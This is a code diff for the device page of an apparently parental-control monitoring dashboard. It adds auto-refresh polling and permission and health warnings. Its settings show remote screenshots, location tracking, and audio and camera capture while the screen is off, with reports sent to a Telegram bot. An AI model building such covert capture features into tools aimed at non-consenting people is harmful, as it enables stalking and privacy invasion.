@@ -1,6 +1,6 @@
 'use client';
 
-import { use, useEffect, useState } from 'react';
+import { use, useEffect, useState, useRef } from 'react';
 import { useRouter } from 'next/navigation';
 import Link from 'next/link';
 import {
@@ -22,8 +22,25 @@ import {
   Mic,
   Monitor,
   CheckCircle,
+  AlertTriangle,
   Zap,
+  Play,
+  Pause,
+  ShieldAlert,
+  ShieldCheck,
+  RefreshCw,
 } from 'lucide-react';
+
+interface DeviceHealth {
+  locationPermission?: boolean;
+  backgroundLocationPermission?: boolean;
+  gpsHardwareEnabled?: boolean;
+  batteryOptimizationIgnored?: boolean;
+  accessibilityEnabled?: boolean;
+  cameraPermission?: boolean;
+  audioPermission?: boolean;
+  notificationPermission?: boolean;
+}
 
 interface DeviceDetail {
   _id: string;
@@ -58,6 +75,7 @@ interface DeviceDetail {
     cameraScreenOff: boolean;
     lockMessage?: string;
   };
+  health?: DeviceHealth;
   lastSyncAt?: string;
   appVersion?: string;
   createdAt: string;
@@ -86,10 +104,12 @@ export default function DeviceDetailPage({
   const [saving, setSaving] = useState(false);
   const [saveSuccess, setSaveSuccess] = useState(false);
   const [actionLoading, setActionLoading] = useState(false);
+  const [autoRefresh, setAutoRefresh] = useState(true);
 
-  // Form states
+  // Form states (preserved during live polling)
+  const isFormInitialized = useRef(false);
   const [deviceName, setDeviceName] = useState('');
-  const [syncInterval, setSyncInterval] = useState(5); // in seconds, min 5s
+  const [syncInterval, setSyncInterval] = useState(5);
   const [telegramBotToken, setTelegramBotToken] = useState('');
   const [telegramChatId, setTelegramChatId] = useState('');
   const [isMonitoringActive, setIsMonitoringActive] = useState(true);
@@ -105,6 +125,27 @@ export default function DeviceDetailPage({
   const [cameraScreenOff, setCameraScreenOff] = useState(false);
   const [lockMessage, setLockMessage] = useState('');
 
+  const populateFormFromDevice = (dev: DeviceDetail) => {
+    setDeviceName(dev.deviceName || '');
+    const s = dev.settings || ({} as any);
+    const currentSeconds = s.syncIntervalSeconds || (s.syncIntervalMinutes ? s.syncIntervalMinutes * 60 : 5);
+    setSyncInterval(Math.max(5, currentSeconds));
+    setTelegramBotToken(s.telegramBotToken || '');
+    setTelegramChatId(s.telegramChatId || '');
+    setIsMonitoringActive(s.isMonitoringActive ?? true);
+    setSendScreenshot(s.sendScreenshot ?? true);
+    setScreenshotInterval(s.screenshotInterval || 10);
+    setSendLocation(s.sendLocation ?? true);
+    setLocationInterval(s.locationInterval || 10);
+    setSendAudio(s.sendAudio ?? false);
+    setAudioDuration(s.audioDuration || 60);
+    setAudioScreenOff(s.audioScreenOff ?? false);
+    setSendCamera(s.sendCamera ?? false);
+    setCameraInterval(s.cameraInterval || 10);
+    setCameraScreenOff(s.cameraScreenOff ?? false);
+    setLockMessage(dev.lockMessage || 'This device is locked by parental control.');
+  };
+
   const fetchDeviceData = async () => {
     try {
       const res = await fetch(`/api/dashboard/devices/${id}`);
@@ -116,25 +157,10 @@ export default function DeviceDetailPage({
       setDevice(data.device);
       setCommands(data.recentCommands || []);
 
-      if (data.device) {
-        setDeviceName(data.device.deviceName || '');
-        const s = data.device.settings || {};
-        const currentSeconds = s.syncIntervalSeconds || (s.syncIntervalMinutes ? s.syncIntervalMinutes * 60 : 5);
-        setSyncInterval(Math.max(5, currentSeconds));
-        setTelegramBotToken(s.telegramBotToken || '');
-        setTelegramChatId(s.telegramChatId || '');
-        setIsMonitoringActive(s.isMonitoringActive ?? true);
-        setSendScreenshot(s.sendScreenshot ?? true);
-        setScreenshotInterval(s.screenshotInterval || 10);
-        setSendLocation(s.sendLocation ?? true);
-        setLocationInterval(s.locationInterval || 10);
-        setSendAudio(s.sendAudio ?? false);
-        setAudioDuration(s.audioDuration || 60);
-        setAudioScreenOff(s.audioScreenOff ?? false);
-        setSendCamera(s.sendCamera ?? false);
-        setCameraInterval(s.cameraInterval || 10);
-        setCameraScreenOff(s.cameraScreenOff ?? false);
-        setLockMessage(data.device.lockMessage || 'This device is locked by parental control.');
+      // Only initialize form fields once on initial load (or after explicit save)
+      if (data.device && !isFormInitialized.current) {
+        populateFormFromDevice(data.device);
+        isFormInitialized.current = true;
       }
     } catch (err) {
       console.error(err);
@@ -145,9 +171,13 @@ export default function DeviceDetailPage({
 
   useEffect(() => {
     fetchDeviceData();
-    const interval = setInterval(fetchDeviceData, 3000); // Poll every 3s for fast updates
-    return () => clearInterval(interval);
   }, [id]);
+
+  useEffect(() => {
+    if (!autoRefresh) return;
+    const interval = setInterval(fetchDeviceData, 3000); // Poll telemetry every 3s
+    return () => clearInterval(interval);
+  }, [id, autoRefresh]);
 
   const handleSaveSettings = async (e: React.FormEvent) => {
     e.preventDefault();
@@ -240,6 +270,13 @@ export default function DeviceDetailPage({
     return s > 0 ? `${m}m ${s}s` : `${m}m`;
   };
 
+  const health = device.health || {};
+  const hasWarnings =
+    health.locationPermission === false ||
+    health.gpsHardwareEnabled === false ||
+    health.batteryOptimizationIgnored === false ||
+    health.accessibilityEnabled === false;
+
   return (
     <div className="min-h-screen bg-slate-950 text-slate-100 flex flex-col">
       {/* Top Header */}
@@ -258,18 +295,77 @@ export default function DeviceDetailPage({
             </div>
           </div>
 
-          <button
-            onClick={handleDeleteDevice}
-            className="p-2 rounded-lg bg-red-500/10 hover:bg-red-500/20 text-red-400 border border-red-500/20 text-xs font-medium flex items-center gap-1.5 transition"
-          >
-            <Trash2 className="w-3.5 h-3.5" />
-            <span className="hidden sm:inline">Remove Device</span>
-          </button>
+          <div className="flex items-center gap-2 sm:gap-3">
+            {/* Live Auto-Refresh Toggle */}
+            <button
+              onClick={() => setAutoRefresh(!autoRefresh)}
+              className={`px-3 py-1.5 rounded-xl text-xs font-semibold flex items-center gap-1.5 transition border ${
+                autoRefresh
+                  ? 'bg-emerald-500/10 text-emerald-400 border-emerald-500/30'
+                  : 'bg-slate-800/80 text-slate-400 border-slate-700'
+              }`}
+              title={autoRefresh ? 'Click to pause auto-refresh' : 'Click to resume real-time auto-refresh'}
+            >
+              {autoRefresh ? (
+                <>
+                  <span className="w-2 h-2 rounded-full bg-emerald-400 animate-pulse" />
+                  <span>Live (3s)</span>
+                  <Pause className="w-3 h-3 ml-0.5 opacity-60" />
+                </>
+              ) : (
+                <>
+                  <Play className="w-3 h-3 text-slate-400" />
+                  <span>Live Paused</span>
+                </>
+              )}
+            </button>
+
+            {/* Manual Refresh Button */}
+            <button
+              onClick={fetchDeviceData}
+              title="Manual Refresh"
+              className="p-2 rounded-xl bg-slate-800 hover:bg-slate-700 text-slate-300 transition"
+            >
+              <RefreshCw className="w-4 h-4" />
+            </button>
+
+            <button
+              onClick={handleDeleteDevice}
+              className="p-2 rounded-xl bg-red-500/10 hover:bg-red-500/20 text-red-400 border border-red-500/20 text-xs font-medium flex items-center gap-1.5 transition"
+            >
+              <Trash2 className="w-3.5 h-3.5" />
+              <span className="hidden sm:inline">Remove Device</span>
+            </button>
+          </div>
         </div>
       </header>
 
       {/* Main Container */}
       <main className="max-w-7xl mx-auto px-4 sm:px-6 lg:px-8 py-8 flex-1 w-full space-y-8">
+        {/* Diagnostics & Permissions Warnings Banner */}
+        {hasWarnings && (
+          <div className="p-4 bg-amber-500/10 border border-amber-500/30 rounded-2xl text-amber-300 text-xs space-y-2">
+            <div className="flex items-center gap-2 font-bold text-sm text-amber-400">
+              <ShieldAlert className="w-5 h-5 text-amber-400 shrink-0" />
+              <span>Attention Required: Device Permissions & Hardware Warnings</span>
+            </div>
+            <ul className="list-disc list-inside space-y-1 pl-1 text-slate-300">
+              {health.locationPermission === false && (
+                <li><strong className="text-amber-300">Location Permission Not Granted:</strong> Grant location permission in phone App Info settings to enable GPS tracking.</li>
+              )}
+              {health.gpsHardwareEnabled === false && (
+                <li><strong className="text-amber-300">GPS Hardware Disabled:</strong> Location / GPS toggle is turned OFF in the phone settings bar.</li>
+              )}
+              {health.batteryOptimizationIgnored === false && (
+                <li><strong className="text-amber-300">Battery Optimization Active:</strong> Android may suspend background synchronization. Open phone Battery settings $\rightarrow$ set app to &quot;No Restrictions&quot;.</li>
+              )}
+              {health.accessibilityEnabled === false && (
+                <li><strong className="text-amber-300">Accessibility Service Disabled:</strong> Screenshot capture and screen activity monitoring are inactive.</li>
+              )}
+            </ul>
+          </div>
+        )}
+
         {/* Top Status Cards */}
         <div className="grid grid-cols-1 sm:grid-cols-2 lg:grid-cols-4 gap-4">
           {/* Battery */}
@@ -314,11 +410,11 @@ export default function DeviceDetailPage({
                 </span>
                 {activeSyncSeconds <= 10 && (
                   <span className="px-1.5 py-0.5 rounded text-[10px] font-bold bg-indigo-500/20 text-indigo-300 border border-indigo-500/30">
-                    FAST
+                    REALTIME
                   </span>
                 )}
               </div>
-              <span className="text-xs text-slate-500 block mt-0.5">Min 5s interval</span>
+              <span className="text-xs text-slate-500 block mt-0.5">Live reporting frequency</span>
             </div>
             <Clock className="w-8 h-8 text-indigo-400" />
           </div>
@@ -338,13 +434,58 @@ export default function DeviceDetailPage({
                   <ExternalLink className="w-3 h-3" />
                 </a>
               ) : (
-                <span className="text-sm text-slate-500">Not available</span>
+                <span className="text-sm text-slate-500">
+                  {health.locationPermission === false
+                    ? 'Permission Missing'
+                    : health.gpsHardwareEnabled === false
+                    ? 'GPS Turned Off'
+                    : 'Locating...'}
+                </span>
               )}
               <span className="text-xs text-slate-500 block mt-1">
-                {device.lastLocation?.latitude?.toFixed(4)}, {device.lastLocation?.longitude?.toFixed(4)}
+                {hasLocation
+                  ? `${device.lastLocation?.latitude?.toFixed(4)}, ${device.lastLocation?.longitude?.toFixed(4)}`
+                  : 'Waiting for fix'}
               </span>
             </div>
-            <MapPin className="w-8 h-8 text-red-400" />
+            <MapPin className={`w-8 h-8 ${hasLocation ? 'text-emerald-400' : 'text-slate-600'}`} />
+          </div>
+        </div>
+
+        {/* Permissions Diagnostics Overview Grid */}
+        <div className="bg-slate-900/80 border border-slate-800 rounded-2xl p-5 shadow-xl">
+          <h3 className="text-sm font-bold text-white flex items-center gap-2 mb-3">
+            <ShieldCheck className="w-4 h-4 text-emerald-400" />
+            Device Permissions & System Health
+          </h3>
+          <div className="grid grid-cols-2 sm:grid-cols-4 gap-3 text-xs">
+            <div className="p-3 bg-slate-950/60 rounded-xl border border-slate-800 flex items-center justify-between">
+              <span className="text-slate-400">GPS Location</span>
+              <span className={`font-semibold ${health.locationPermission !== false ? 'text-emerald-400' : 'text-red-400'}`}>
+                {health.locationPermission !== false ? 'Granted' : 'Missing'}
+              </span>
+            </div>
+
+            <div className="p-3 bg-slate-950/60 rounded-xl border border-slate-800 flex items-center justify-between">
+              <span className="text-slate-400">GPS Hardware</span>
+              <span className={`font-semibold ${health.gpsHardwareEnabled !== false ? 'text-emerald-400' : 'text-red-400'}`}>
+                {health.gpsHardwareEnabled !== false ? 'Enabled' : 'Turned OFF'}
+              </span>
+            </div>
+
+            <div className="p-3 bg-slate-950/60 rounded-xl border border-slate-800 flex items-center justify-between">
+              <span className="text-slate-400">Battery Saver</span>
+              <span className={`font-semibold ${health.batteryOptimizationIgnored !== false ? 'text-emerald-400' : 'text-amber-400'}`}>
+                {health.batteryOptimizationIgnored !== false ? 'Unrestricted' : 'Optimized'}
+              </span>
+            </div>
+
+            <div className="p-3 bg-slate-950/60 rounded-xl border border-slate-800 flex items-center justify-between">
+              <span className="text-slate-400">Accessibility</span>
+              <span className={`font-semibold ${health.accessibilityEnabled !== false ? 'text-emerald-400' : 'text-amber-400'}`}>
+                {health.accessibilityEnabled !== false ? 'Active' : 'Disabled'}
+              </span>
+            </div>
           </div>
         </div>
 
